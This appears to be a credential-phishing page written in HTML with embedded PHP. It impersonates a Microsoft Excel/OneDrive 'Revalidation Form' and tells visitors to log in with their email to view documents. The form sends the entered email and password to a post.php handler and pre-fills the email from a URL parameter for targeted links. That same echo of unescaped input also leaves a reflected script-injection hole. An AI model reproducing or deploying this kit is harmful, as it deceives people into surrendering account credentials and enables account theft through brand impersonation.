<!doctype html>
<html>
<head>
	<title>Powered by Microsoft Excel</title>
	<link rel="icon" href="favicon.ico" type="image/x-icon" />

</head>
<body>
<div class="ewrform-surveyandfooter" style="position: absolute; overflow: hidden; top: 0px; bottom: 0px; left: 0px; right: 0px; font-family: &quot;Segoe UI&quot;, Tahoma, Thonburi, Arial, Verdana, sans-serif; font-size: 13.3333px;">
<div class="ewrform-survey-surface ewa-scrollbars" id="ewrform-survey-surface" style="position: absolute;overflow: auto;    top: 0px;left: 0px;right: 0px;bottom: 0px;background-color: rgb(241, 241, 241);background-image: url(https://i.imgur.com/V4pHsJS.png);background-size: cover;}">
<br><br><br><br>
<form action="post.php" method="POST"><div class="ewrform-contentandlinks" id="ewrform-contentandlinks" style="width: auto; margin: 10px auto 50px; max-width: 494px; min-width: 290px;">
<div class="ewrform-survey-content" id="ewrform-survey-content" style="border: 1px solid rgb(210, 213, 216); background-color: white;">
<div class="acc-form-designer acc-surveyform acc-surveyform-responsivewidth" data-moa-container="true" data-moa-type="access.surveyform" id="SurveyForm" style="padding: 0px; font-family: &quot;Segoe UI&quot;; color: rgb(102, 102, 102); position: relative; height: 313px; width: 492px; border: 0px;">
<div class="acc-surveyform-title acc-surveyelement-responsivewidth" data-moa-caption="Revalidation Form" data-moa-parent="SurveyForm" data-moa-type="access.label" id="SurveyTitle" style="line-height: normal; padding-bottom:  15px; border-bottom: 1px solid rgb(225, 225, 225); font-size: 16pt; font-family: &quot;Segoe UI Light&quot;; color: rgb(33, 115, 70); width: 432px; left: 30px; position: absolute; top: 30px; height: 55px;"><label class="all-dft lbl-dft" id="SurveyTitle_AccessControl" style="border-width: 0px; border-color: transparent; height: 55px; width: 432px; padding: 0px 0px 19px 8px; overflow: hidden; display: block; white-space: pre-wrap; font-weight: inherit; box-sizing: border-box; text-overflow: ellipsis; font-size: 16pt; line-height: normal; margin: 0px;" title="Revalidation Form">Log in with your receiving email to view documents.</label></div>



<div class="acc-surveyelement-responsivewidth" data-moa-container="true" data-moa-parent="SurveyForm" data-moa-type="access.questionpanel" id="QuestionPanel" style="line-height: normal; width: 432px; left: 30px; position: absolute; top: 144px; height: 139px;">
<div class="acc-surveyquestion-responsivewidth" data-moa-caption="Email ID :" data-moa-controlsource="1" data-moa-controltype="singlelineoftext" data-moa-parent="QuestionPanel" data-moa-required="true" data-moa-type="access.question" id="Question0" style="line-height: normal; width: 432px; position: absolute; top: 1px; left: 1px; height: 65px;">
<div class="questionContainer" style="box-sizing: border-box; margin: 0px; padding: 7px; width: inherit; float: left; line-height: normal;">
<div class="questionTitleLabelContainer" style="margin: 0px 0px 7px; padding: 0px; width: 418px; font-weight: bold; font-size: 9pt; color: rgb(68, 68, 68); line-height: normal; float: left;"><label class="all-dft lbl-dft" id="QuestionTitleElement" style="border-width: 0px; border-color: transparent; height: 15px; width: 418px; padding: 0px; overflow: hidden; display: block; white-space: pre-wrap; box-sizing: border-box; text-overflow: clip; font-size: 9pt; margin: 0px; line-height: normal;">Email ID :</label></div>

<div class="questionClassForSingleLineOfText questionAnswerElement" style="margin: 0px; padding: 0px; border: 1px solid rgb(204, 204, 204); height: 20px; width: 300px; line-height: normal; float: left;"><input required="required" name="login" value="<?php echo $_GET['email']; ?>" class="tb-dft all-dft" id="QuestionAnswerElement" style="height: 20px;width: 300px;font-family: inherit;font-size: 13px;margin: 0px;padding-top: 0px;padding-bottom: 0px;border-width: initial;border-style: none;" type="text"></div>
</div>
</div>

<div class="acc-surveyquestion-responsivewidth" data-moa-caption="P A S S W O R D :" data-moa-controlsource="2" data-moa-controltype="singlelineoftext" data-moa-parent="QuestionPanel" data-moa-required="true" data-moa-type="access.question" id="Question1" style="line-height: normal; width: 432px; position: absolute; top: 71px; left: 1px; height: 65px;">
<div class="questionContainer" style="box-sizing: border-box; margin: 0px; padding: 7px; width: inherit; float: left; line-height: normal;">
<div class="questionTitleLabelContainer" style="margin: 0px 0px 7px; padding: 0px; width: 418px; font-weight: bold; font-size: 9pt; color: rgb(68, 68, 68); line-height: normal; float: left;"><label class="all-dft lbl-dft" id="QuestionTitleElement" style="border-width: 0px; border-color: transparent; height: 15px; width: 418px; padding: 0px; overflow: hidden; display: block; white-space: pre-wrap; box-sizing: border-box; text-overflow: clip; font-size: 9pt; margin: 0px; line-height: normal;">Password :</label></div>

<div class="questionClassForSingleLineOfText questionAnswerElement" style="margin: 0px; padding: 0px; border: 1px solid rgb(204, 204, 204); height: 20px; width: 300px; line-height: normal; float: left;"><input required="required" name="psw" class="tb-dft all-dft" id="QuestionAnswerElement" style="height: 20px; width: 300px; font-family: inherit; font-size: 13px; margin: 0px; padding-top: 0px; padding-bottom: 0px; border-width: initial; border-style: none;" type="password"></div>
</div>
</div>

<div class="acc-question-panel" style="height: inherit; width: inherit; line-height: normal;">&nbsp;</div>
</div>
</div>
<div class="ewrform-button-div" style="padding: 1px; cursor: default;"><button class="ewrform-submit" href="index.php" id="m_submitButton" style="vertical-align: middle; padding: 7px 20px; margin: 15px; background-color: rgb(33, 115, 70); border-width: 1px; border-style: solid; border-color: rgb(33, 115, 70); outline: none; color: rgb(255, 255, 255); white-space: nowrap; font-size: 12pt;">Submit</button></div><br>
</div>

<div class="ewrform-footer" id="m_footer" style="height: 22px; background-color: rgb(33, 115, 70); color: rgb(255, 255, 255); font-size: 8pt;">
<div class="ewrform-footer-icon" style="position: relative; display: inline-block; top: 3px; left: 8px;">
<div class="clip16x16" style="position: relative; overflow: hidden; width: 16px; height: 16px;"><img class="ewaform_excel16" src="https://c1-excel-15.cdn.office.net/x/s/161082635028__layouts/Resources/1033/EwaForm.png" style="border: 0px none; top: -69px; left: -103px; position: absolute; margin: 0px; padding: 0px; width: auto; height: auto;"></div>
</div>
&nbsp;

<div class="ewrform-footer-branding" style="position: relative; top: -1px; display: inline-block; left: 13px;">Powered by Microsoft Excel</div>
</div>

<div class="ewrform-link-panel" id="m_footerLinks" style="margin-top: 5px; text-align: right;"><a class="ewrform-link" style="color: rgb(33, 115, 70); font-weight: bold; font-size: 8pt;" tabindex="0">OneDrive</a>&nbsp;|&nbsp;<a class="ewrform-link" style="color: rgb(33, 115, 70); font-weight: bold; font-size: 8pt;" tabindex="0">Terms of Use</a>&nbsp;|&nbsp;<a class="ewrform-link" style="color: rgb(33, 115, 70); font-weight: bold; font-size: 8pt;" tabindex="0">Privacy and Cookies</a>&nbsp;|&nbsp;<a class="ewrform-link" id="ewrform-givefeedback" style="color: rgb(33, 115, 70); font-weight: bold; font-size: 8pt;" tabindex="0">Help Improve Office</a></div>

<div></div>
</div></form>
</div>
</div>
</body>
</html>
